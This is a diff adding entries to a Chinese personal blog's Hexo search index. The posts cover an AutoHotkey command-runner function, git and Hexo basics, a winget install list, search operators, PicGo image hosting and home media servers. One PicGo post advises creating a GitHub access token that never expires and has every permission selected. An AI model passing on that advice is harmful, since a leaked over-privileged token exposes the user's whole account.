</span><br><span class="line">    If ( !DllCall( <span class="string">&quot;CreateProcess&quot;</span>, Ptr,<span class="number">0</span>, Ptr,&amp;sCmd, Ptr,<span class="number">0</span>, Ptr,<span class="number">0</span>, Int,<span class="literal">True</span>, UInt,<span class="number">0</span>x08000000</span><br><span class="line"><span class="title">                                  , Ptr,0, Ptr,sDir?&amp;sDir:</span><span class="number">0</span>, Ptr,&amp;si, Ptr,&amp;pi ) )</span><br><span class="line">        <span class="keyword">Return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      , DllCall( <span class="string">&quot;CloseHandle&quot;</span>, Ptr,hStdOutWr )</span><br><span class="line">      , DllCall( <span class="string">&quot;CloseHandle&quot;</span>, Ptr,hStdOutRd )</span><br><span class="line"> </span><br><span class="line">    DllCall( <span class="string">&quot;CloseHandle&quot;</span>, Ptr,hStdOutWr ) <span class="comment">; The write pipe must be closed before reading the stdout.</span></span><br><span class="line">    While ( <span class="number">1</span> )</span><br><span class="line">    &#123; <span class="comment">; Before reading, we check if the pipe has been written to, so we avoid freezings.</span></span><br><span class="line">        If ( !DllCall( <span class="string">&quot;PeekNamedPipe&quot;</span>, Ptr,hStdOutRd, Ptr,<span class="number">0</span>, UInt,<span class="number">0</span>, Ptr,<span class="number">0</span>, UIntP,nTot, Ptr,<span class="number">0</span> ) )</span><br><span class="line">            <span class="keyword">Break</span></span><br><span class="line">        If ( !nTot )</span><br><span class="line">        &#123; <span class="comment">; If the pipe buffer is empty, sleep and continue checking.</span></span><br><span class="line"><span class="built_in">            Sleep,</span> <span class="number">100</span></span><br><span class="line">            <span class="keyword">Continue</span></span><br><span class="line">        &#125; <span class="comment">; Pipe buffer is not empty, so we can read it.</span></span><br><span class="line">        VarSetCapacity(sTemp, nTot+<span class="number">1</span>)</span><br><span class="line">        DllCall( <span class="string">&quot;ReadFile&quot;</span>, Ptr,hStdOutRd, Ptr,&amp;sTemp, UInt,nTot, PtrP,nSize, Ptr,<span class="number">0</span> )</span><br><span class="line">        sOutput .= StrGet(&amp;sTemp, nSize, sEncoding)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">; * SKAN has managed the exit code through SetLastError.</span></span><br><span class="line">    DllCall( <span class="string">&quot;GetExitCodeProcess&quot;</span>, Ptr,NumGet(pi,<span class="number">0</span>), UIntP,nExitCode )</span><br><span class="line">    DllCall( <span class="string">&quot;CloseHandle&quot;</span>,        Ptr,NumGet(pi,<span class="number">0</span>)                  )</span><br><span class="line">    DllCall( <span class="string">&quot;CloseHandle&quot;</span>,        Ptr,NumGet(pi,<span class="built_in">A_PtrSize</span>)          )</span><br><span class="line">    DllCall( <span class="string">&quot;CloseHandle&quot;</span>,        Ptr,hStdOutRd                     )</span><br><span class="line">    <span class="keyword">Return</span> sOutput</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> ahk </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ahk </tag>
+            
+            <tag> cmd </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>bat脚本还值得学吗</title>
+      <link href="/2024/01/26/bat%E8%84%9A%E6%9C%AC%E8%BF%98%E5%80%BC%E5%BE%97%E5%AD%A6%E5%90%97/"/>
+      <url>/2024/01/26/bat%E8%84%9A%E6%9C%AC%E8%BF%98%E5%80%BC%E5%BE%97%E5%AD%A6%E5%90%97/</url>
+      
+        <content type="html"><![CDATA[<h1 id="过时了吗"><a href="#过时了吗" class="headerlink" title="过时了吗"></a>过时了吗</h1><p>是的,过时的玩意,只是这玩意在很长的一段时间里面还是用得上的,一般来说搞自动化办公的话,无论写什么语言,学过点bat之类的还是有用的,当然不值得深入研究</p><h1 id="powershell呢"><a href="#powershell呢" class="headerlink" title="powershell呢"></a>powershell呢</h1><p>可以用.net对象,不过,用不上,简单的bat处理,稍微复杂的ahk写,ps的简单的地方更复杂,办公自动化真的用不到太多复杂的功能</p><h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><p><a href="https://wsgzao.github.io/post/windows-batch/">https://wsgzao.github.io/post/windows-batch/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cmd </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cmd </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>picgo使用</title>
+      <link href="/2024/01/26/picgo%E4%BD%BF%E7%94%A8/"/>
+      <url>/2024/01/26/picgo%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="几种上传图片的方式"><a href="#几种上传图片的方式" class="headerlink" title="几种上传图片的方式"></a>几种上传图片的方式</h1><ol><li><p>截图到剪切板,给上传剪切板弄个快捷键或者鼠标点</p></li><li><p>网络图片啥的直接拖拽上去就得了</p></li><li><p>本地文件拖拽上传或者直接命令行,弄个tc命令也可以</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picgo.exe upload <span class="variable">%P%</span>S</span><br></pre></td></tr></table></figure></li></ol><h1 id="多设备"><a href="#多设备" class="headerlink" title="多设备"></a>多设备</h1><p>直接装客户端,分享配置即可,包括安卓手机也有客户端</p><p>局域网内看起来可以开个小型服务器来接受其他设备的请求,我感觉是没必要,用不到的</p><h1 id="重命名上传"><a href="#重命名上传" class="headerlink" title="重命名上传"></a>重命名上传</h1><p>有配置项,可以选择按时间戳上传,上传前是否要确认重命名<br>目前不知道上传后能不能简单重命名</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 图床 </tag>
+            
+            <tag> picgo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>搜索语法简析</title>
+      <link href="/2024/01/25/%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%E7%AE%80%E6%9E%90/"/>
+      <url>/2024/01/25/%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%E7%AE%80%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么写"><a href="#为什么写" class="headerlink" title="为什么写"></a>为什么写</h1><p>还有人问我什么是搜索引擎语法,这个也是网上冲浪的基本功了,大幅提高信息获取能力的</p><p>本文不抄网上的语法汇总啥的,根据情况补充一下实例</p><p>另外其实搜索引擎的搜索和ev的搜索语法,还是有很多相似之处的,多类比</p><p>下面这博文可以用来速查语法</p><p><a href="https://www.cnblogs.com/hthty/p/17336495.html">https://www.cnblogs.com/hthty/p/17336495.html</a></p><h1 id="排除某些结果"><a href="#排除某些结果" class="headerlink" title="排除某些结果"></a>排除某些结果</h1><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240125232044.png"></p><p>比如这样,写法就是-内容 </p><p>可以缩小搜索的范围,排除首页上出现的无关内容</p><h1 id="精确搜索"><a href="#精确搜索" class="headerlink" title="精确搜索"></a>精确搜索</h1><p>这个是防止搜索引擎拆开你的搜索词</p><p>“海贼王” 比如这样,就不会拆开搜索海贼和王了</p><h1 id="安全搜索"><a href="#安全搜索" class="headerlink" title="安全搜索"></a>安全搜索</h1><p>为了方便我平常是不开安全搜索全局选项的,毕竟偶尔还是要搞黄色,但是在外面搜索的时候一不小心搜出来就尴尬了,可以safesearch:这样加上选项</p><h1 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h1><p>很多没有自带搜索的网站都可以用 site:域名 xxx的形式来搜索,当然这个也可以用来过滤特定一级域名网站的作用,比如site:gov这样,根据需要过滤的层级需求来写</p><h1 id="特定格式文件"><a href="#特定格式文件" class="headerlink" title="特定格式文件"></a>特定格式文件</h1><p>这个也有用的,平常想要下pdf电子书比如 filetype:pdf 网络是怎样连接的</p><p>当然直接后面空格pdf也是可以的,但是这样搜索更精确,结果基本就是点击即为下载了</p><h1 id="什么时候该用或"><a href="#什么时候该用或" class="headerlink" title="什么时候该用或"></a>什么时候该用或</h1><p>搜索的时候总是喜欢空格关键词,这样实际上是AND的效果,这样可以缩小范围,但是有的时候需要扩大范围,那么就该使用OR的语法 了,符号就是|</p><h1 id="限定日期"><a href="#限定日期" class="headerlink" title="限定日期"></a>限定日期</h1><p>有时效性需求的时候,可以加上datarange:当然这个直接点击下面的时间更方便</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 搜索 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 搜索 </tag>
+            
+            <tag> 谷歌 </tag>
+            
+            <tag> 搜索语法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>git简单使用</title>
+      <link href="/2024/01/25/git%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
+      <url>/2024/01/25/git%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于git"><a href="#关于git" class="headerlink" title="关于git"></a>关于git</h1><p>每到用的时候,总是发现自己在git上了解甚少,这是个基础技能,虽然不用学到登峰造极,但是,常见的问题还是必须知道如何解决的,不然很多开源项目根本没法入门</p><p>但是也不用花太多时间,最基本的了解即可</p><h1 id="git和github和gitee的关系"><a href="#git和github和gitee的关系" class="headerlink" title="git和github和gitee的关系"></a>git和github和gitee的关系</h1><p>git是版本控制的工具,github等不过是个存储的地方</p><p>实际使用git的时候,基本上都要接触github的,绑一起的关系,本文也会说说github的使用</p><h1 id="git最基础需要把握的流程命令"><a href="#git最基础需要把握的流程命令" class="headerlink" title="git最基础需要把握的流程命令"></a>git最基础需要把握的流程命令</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\test</span><br><span class="line">git clone https://github.com/hzncpa/pichost.git</span><br><span class="line"><span class="comment">rem 一般克隆别人的项目只能https这个,自己的项目添加了公钥就ssh地址</span></span><br><span class="line"><span class="built_in">cd</span> pichost.git\</span><br><span class="line">git init</span><br><span class="line"><span class="comment">rem 无论是新项目还是老项目,随手init一下先</span></span><br><span class="line"><span class="comment">rem 一番修改之后</span></span><br><span class="line">git add -A</span><br><span class="line"><span class="comment">rem 这个也可以根据你实际修改的add的内容</span></span><br><span class="line">git commit -m &quot;test&quot;</span><br><span class="line"><span class="comment">rem commit的时候写好message省的进入 vim再填写了</span></span><br><span class="line"><span class="comment">rem 下面就是主要的争议和麻烦所在了,如果是自己的项目添加了公钥直接后面填上ssh地址</span></span><br><span class="line"><span class="comment">rem 如果是https的话要配置access token</span></span><br><span class="line"><span class="comment">rem 可以根据需求把这里默认设置为ssh地址,上面的项目克隆来的,默认是当时填的https地址</span></span><br><span class="line">git push ssh地址</span><br></pre></td></tr></table></figure><p>这是最简单的一套流程,把握了以后起码克隆,修改,push回去没问题了</p><h1 id="github身份验证和配置"><a href="#github身份验证和配置" class="headerlink" title="github身份验证和配置"></a>github身份验证和配置</h1><p>如何生成ssh公钥,填入github网上教程太多, 另外本地建立版本库的时候如果没有填过邮箱和用户名也是会消息提醒你操作的,这些不多写了</p><p>但是一定要知道几个步骤</p><ol><li>生成公钥填在github上</li><li>本地填写邮箱和用户名</li><li>获取access token这个是https需要的,简单配置</li></ol><h1 id="git使用过程中的报错"><a href="#git使用过程中的报错" class="headerlink" title="git使用过程中的报错"></a>git使用过程中的报错</h1><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>一大半是网络报错,保险的方案是梯子改成tun模式,不要开系统代理,无梯子的情况不讨论</p><h2 id="仓库权限-身份验证"><a href="#仓库权限-身份验证" class="headerlink" title="仓库权限,身份验证"></a>仓库权限,身份验证</h2><p>检查ssh公钥填写,还有自己push的时候用的倒是是ssh还是https</p><h2 id="git版本"><a href="#git版本" class="headerlink" title="git版本"></a>git版本</h2><p>不要乱安装ruby上面的git之类的,就用winget装的git就行,装的乱了,可能有小问题</p><h2 id="解决报错的方案"><a href="#解决报错的方案" class="headerlink" title="解决报错的方案"></a>解决报错的方案</h2><p>这个没办法,复制了谷歌吧</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> git </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> git </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hexo搭建年轻人的第一个博客</title>
+      <link href="/2024/01/25/hexo%E6%90%AD%E5%BB%BA%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/"/>
+      <url>/2024/01/25/hexo%E6%90%AD%E5%BB%BA%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="hexo是做啥的"><a href="#hexo是做啥的" class="headerlink" title="hexo是做啥的?"></a>hexo是做啥的?</h1><p>就是依据配置文件和md文件生成静态网页的</p><h1 id="发布在哪里"><a href="#发布在哪里" class="headerlink" title="发布在哪里?"></a>发布在哪里?</h1><p>github page,当然gitee也可以,但是要实名,等好几天,速度快,懒得等,当然,也可以同时部署两个平台,全都要</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>简略的说说环境搭建吧,也给我未来的我看</p><ol><li>winget install OpenJS.NodeJS.LTS  切记lts的nodejs,很多theme没有适配高版本的</li><li>winget install Git.Git; 这个单独装好,git真的就是基础设施</li><li>npm install -g hexo-cli</li><li>在博客目录中 hexo init 完事</li></ol><h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>git clone主题到theme就可以了,npm也行</p><p>next,butterfly这几个高星的就行</p><h1 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h1><p>一般是命令连用</p><p>比如本地服务器预览</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean;hexo g;hexo s</span><br></pre></td></tr></table></figure><p>比如部署一套的命令是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean;hexo d <span class="literal">-g</span></span><br></pre></td></tr></table></figure><p>直接写成bat或者ps1也行,实现一键部署</p><h1 id="部署配置的坑"><a href="#部署配置的坑" class="headerlink" title="部署配置的坑"></a>部署配置的坑</h1><p>这个坑其实来自git,想要配置号部署,git的配置一定得没问题,只要git配置好了,真就收到擒来了</p><p>所以这里就不深入说了,git属于基本功,单独开文章深入说</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> github </tag>
+            
+            <tag> hexo </tag>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>picgo搭建github图床踩坑</title>
+      <link href="/2024/01/25/picgo%E6%90%AD%E5%BB%BAgithub%E5%9B%BE%E5%BA%8A%E8%B8%A9%E5%9D%91/"/>
+      <url>/2024/01/25/picgo%E6%90%AD%E5%BB%BAgithub%E5%9B%BE%E5%BA%8A%E8%B8%A9%E5%9D%91/</url>
+      
+        <content type="html"><![CDATA[<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>这个封面的图片,前后折腾了得有两小时,总算是弄成了github图床,不得不说,看似简单的背后,还是有许多小坑的,网上的教程都一笔带过</p><p>本文不会完整的写出搭建的过程,只是写明操作过程中的坑</p><h1 id="personal-access-token"><a href="#personal-access-token" class="headerlink" title="personal access token"></a>personal access token</h1><p>切记不要选择Fine-grained personal access tokens,进去选无到期日,权限全选</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240125222639.png"></p><p><img src="https://yushuaigee.gitee.io/myblog/img/image-20210113001007861.png"></p><h1 id="picgo中的仓库名"><a href="#picgo中的仓库名" class="headerlink" title="picgo中的仓库名"></a>picgo中的仓库名</h1><p>这个地方要细心,仓库名应该是用户名&#x2F;仓库名,漏写的话其实观察日志也能发现的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 图床 </tag>
+            
+            <tag> github </tag>
+            
+            <tag> picgo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>winget软件列表</title>
+      <link href="/2024/01/25/winget%E8%BD%AF%E4%BB%B6%E5%88%97%E8%A1%A8/"/>
+      <url>/2024/01/25/winget%E8%BD%AF%E4%BB%B6%E5%88%97%E8%A1%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="最简单的用法"><a href="#最简单的用法" class="headerlink" title="最简单的用法"></a>最简单的用法</h1><p>不讲太多花哨的</p><p>winget search搜索install安装即可</p><p>可以用;连接多条,因为就是ps命令</p><p>winget install a b c这样一次安装多个也可以,我个人喜欢拆开分行写,看起来直观,删掉不要的,注释掉也方便</p><h1 id="个人的winget软件列表分享"><a href="#个人的winget软件列表分享" class="headerlink" title="个人的winget软件列表分享"></a>个人的winget软件列表分享</h1><p>可以自己保存一个ps1文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#c++</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2015-2019Redist-x86;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2015-2019Redist-x64;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2013Redist-x86;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2013Redist-x64;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2012Redist-x86;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2012Redist-x64;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2010Redist-x86;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2010Redist-x64;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2008Redist-x86;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2008Redist-x64;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2005Redist-x86;</span></span><br><span class="line"><span class="comment">#winget install Microsoft.VC++2005Redist-x64;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#必须工具</span></span><br><span class="line"><span class="comment">#winget install Kingsoft.WPSOffice;</span></span><br><span class="line"><span class="comment">#winget install Thunder.Thunder;</span></span><br><span class="line"><span class="comment">#winget install Tencent.TIM;</span></span><br><span class="line"><span class="comment">#winget install Baidu.BaiduNetdisk;</span></span><br><span class="line"><span class="comment">#winget install Tencent.WeChat;</span></span><br><span class="line"><span class="comment">#winget install Sogou.SogouInput;</span></span><br><span class="line"><span class="comment">#winget install Nutstore.Nutstore;</span></span><br><span class="line"><span class="comment">#winget install CentStudio.CentBrowser;</span></span><br><span class="line">winget install Pylogmon.pot;</span><br><span class="line">winget install PixPin.PixPin;</span><br><span class="line">winget install qBittorrent.qBittorrent;</span><br><span class="line">winget install Xiaomi.MIUI+;</span><br><span class="line">winget install DupeGuru.DupeGuru</span><br><span class="line">winget install PicGo.PicGo</span><br><span class="line"></span><br><span class="line"><span class="comment">#工具</span></span><br><span class="line">winget install Bin<span class="literal">-Huang</span>.Chatbox;</span><br><span class="line">winget install Youqu.ToDesk;</span><br><span class="line">winget install ByteDance.JianyingPro;</span><br><span class="line">winget install VivaldiTechnologies.Vivaldi;</span><br><span class="line">winget install Microsoft.PowerToys;</span><br><span class="line">winget install Telegram.TelegramDesktop;</span><br><span class="line">winget install Neovim.Neovim;</span><br><span class="line"><span class="comment">#winget install Ditto.Ditto;</span></span><br><span class="line">winget install Valve.Steam;</span><br><span class="line">winget install  MarkText.MarkText;</span><br><span class="line"></span><br><span class="line"><span class="comment">#网盘</span></span><br><span class="line"><span class="comment">#winget install Alibaba.aDrive;</span></span><br><span class="line"><span class="comment">#winget install 115.115;</span></span><br><span class="line"><span class="comment">#winget install Alibaba.QuarkCloudDrive;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#env;</span></span><br><span class="line">winget install SQLite.SQLite;</span><br><span class="line">winget install <span class="literal">--id</span> Microsoft.Powershell <span class="literal">--source</span> winget;</span><br><span class="line"><span class="comment">#winget install JanDeDobbeleer.OhMyPosh -s winget;</span></span><br><span class="line"> winget install OpenJS.NodeJS.LTS</span><br><span class="line">winget install clion;</span><br><span class="line">winget install pycharm;</span><br><span class="line">winget install webstorm;</span><br><span class="line"><span class="comment">#winget install virtualbox;</span></span><br><span class="line"><span class="comment">#winget install Anaconda3;</span></span><br><span class="line">winget install Python.Python.<span class="number">3.8</span>;</span><br><span class="line">winget install Microsoft.VisualStudioCode;</span><br><span class="line">winget install Git.Git;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment"># others</span></span><br><span class="line"><span class="comment">#winget install Giuspen.Cherrytree;</span></span><br><span class="line"><span class="comment">#winget install Meltytech.Shotcut;</span></span><br><span class="line"><span class="comment">#winget install GoldenDict.GoldenDict;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#--scope machine;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 包管理 </tag>
+            
+            <tag> winget </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tc中使用命令行</title>
+      <link href="/2024/01/25/tc%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
+      <url>/2024/01/25/tc%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
+      
+        <content type="html"><![CDATA[<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>很多时候不想专门打开终端,想要直接在tc或者vim中执行命令<br>虽然可以弄个脚本,直接在tc打开的位置打开终端,但是绘制窗口也要等待<br>比如直接一行命令写完<br>vim中也是,有时候就是想hexo n一下</p><h1 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h1><h2 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">ping</span> qq.com &amp; <span class="built_in">pause</span></span><br></pre></td></tr></table></figure><p>省略掉cmd &#x2F;c也可以的,但是个别命令可能会有些许问题,被识别成文件,执行失败后面的pause是为了执行后保留窗口,看到结果,比如hexo d后面不加这个根本不知道结果</p><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoExit</span> <span class="literal">-Command</span> <span class="string">&quot;ping baidu.com;echo success&quot;</span></span><br></pre></td></tr></table></figure><p>powershell就得加上了,一样的原理,加上不退出窗口的参数<br>另外ps中是;来切分命令</p><h1 id="vim中使用"><a href="#vim中使用" class="headerlink" title="vim中使用"></a>vim中使用</h1><p>vim执行外部命令的话,前面要加上!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!ping qq.com &amp; pause</span><br></pre></td></tr></table></figure><p>一样的道理</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> tc </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 命令行 </tag>
+            
+            <tag> tc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>家庭本地影视方案</title>
+      <link href="/2024/01/25/%E5%AE%B6%E5%BA%AD%E6%9C%AC%E5%9C%B0%E5%BD%B1%E8%A7%86%E6%96%B9%E6%A1%88/"/>
+      <url>/2024/01/25/%E5%AE%B6%E5%BA%AD%E6%9C%AC%E5%9C%B0%E5%BD%B1%E8%A7%86%E6%96%B9%E6%A1%88/</url>
+      
+        <content type="html"><![CDATA[<h1 id="影视服务器选择"><a href="#影视服务器选择" class="headerlink" title="影视服务器选择"></a>影视服务器选择</h1><p>主流就是emby和jellyfin,个人觉得emby的客户端更友好一点<br>虽然免费版没有硬件加速,不过够用</p><h1 id="挂削"><a href="#挂削" class="headerlink" title="挂削"></a>挂削</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就是从设置的源网站上爬取信息,速度太快可能封号<br>所以,理论上源网站有的东西都能刮到,没有肯定不行</p><h2 id="非日本动作片"><a href="#非日本动作片" class="headerlink" title="非日本动作片"></a>非日本动作片</h2><p>除了日本动作片之外,理论上有发行的话,tmm都可以挂削,包括阿尔法公司那啥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget install ManuelLaggner.tinyMediaManager</span><br></pre></td></tr></table></figure><p>要配置tmdb的api的,建议官网下便携</p><h2 id="日本动作"><a href="#日本动作" class="headerlink" title="日本动作"></a>日本动作</h2><p>mdcx</p><p><a href="https://github.com/sqzw-x/mdcx/releases">https://github.com/sqzw-x/mdcx/releases</a></p><h2 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h2><p>如果要使用挂削工具的重命名的话建议仔细查看规则,没什么好说的,全是血泪</p><p>emby的搜索和分类查看和tc天上地下,还是需要根据自己的观影需求简单进行分类的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> emby </tag>
+            
+            <tag> 影视 </tag>
+            
+            <tag> 本地 </tag>
+            
+            <tag> 局域网 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>硬路由的功能列举</title>
+      <link href="/2024/01/25/%E7%A1%AC%E8%B7%AF%E7%94%B1%E7%9A%84%E5%8A%9F%E8%83%BD%E5%88%97%E4%B8%BE/"/>
+      <url>/2024/01/25/%E7%A1%AC%E8%B7%AF%E7%94%B1%E7%9A%84%E5%8A%9F%E8%83%BD%E5%88%97%E4%B8%BE/</url>
+      
